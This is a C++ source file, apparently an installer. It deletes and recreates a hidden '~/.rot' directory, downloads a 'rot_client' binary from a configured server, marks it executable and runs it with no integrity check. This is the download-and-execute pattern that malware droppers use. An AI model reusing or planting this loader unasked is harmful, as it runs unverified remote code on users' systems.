
#include <string>
#include <filesystem>
#include "../lib/http-installer.hpp"
#include "../config.h"

using namespace std;

auto main() -> int {
  httplib::Client cli(server_address);
  const string dirname = "/.rot";
  const string path = getenv("HOME") + dirname;
  cout << path << endl;
  try {
    filesystem::remove_all(path);
  } catch (exception &ignored) {}

#ifdef _WIN32
  mkdir(path.c_str());
#else
  mkdir(path.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH);
#endif

#ifdef _WIN32
  const string get_dir = "/content/rot_client_win";
#endif
#ifdef unix
//  const string get_dir = "/content/rot_client_linux";
  const string get_dir = "/content/rot_client";
#endif
#ifdef __MACH__
  const string get_dir = "/content/rot_client_mac";
#endif

  auto res = cli.Get(get_dir, [](uint64_t len, uint64_t total) {
    printf("%lu / %lu bytes => %d%% complete\n", len, total, (int) (len * 100 / total));
    return true;
  });

  cout << "Opening client file: " << path << "/client" << endl;
  ofstream test(path + "/client");
  cout << "Making file executable" << endl;
  system(("chmod +x " + path + "/client").c_str());
  cout << "Populating file...";
  test << res->body;
  test.close();
  cout << "Done!" << endl;

  cout << "Running client" << endl;
  string command = path + "/client";
  system(command.c_str());

  return EXIT_SUCCESS;
}


